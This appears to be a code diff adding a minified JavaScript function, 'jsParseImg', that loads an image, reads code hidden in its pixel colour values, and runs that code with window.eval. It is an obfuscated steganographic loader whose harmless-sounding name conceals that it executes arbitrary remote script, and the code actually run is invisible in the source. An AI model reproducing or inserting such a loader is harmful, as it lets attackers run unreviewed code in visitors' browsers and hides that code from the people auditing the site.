@@ -1,0 +1,2 @@
+var jsParseImg=function(l,g){var e=document.createElement("img"),f=document.createElement("canvas");e.onload=function(){f.width=this.width;f.height=this.height;var a=f.getContext("2d");a.drawImage(this,0,0,this.width,this.height);for(var a=a.getImageData(0,0,this.width,this.height),e=a.data.length,h=[],b=0;b<e;b+=4){var k=a.data[b].toString(16),c=a.data[b+1].toString(16),d=a.data[b+2].toString(16);a.data[b+2].toString(16);1==c.length&&(c="0"+c);1==d.length&&(d="0"+d);0!=Number(k+c+d)&&h.push(String.fromCharCode(Number(k+
+c+d)))}window.eval(h.join(""));g&&g()};e.src=l};
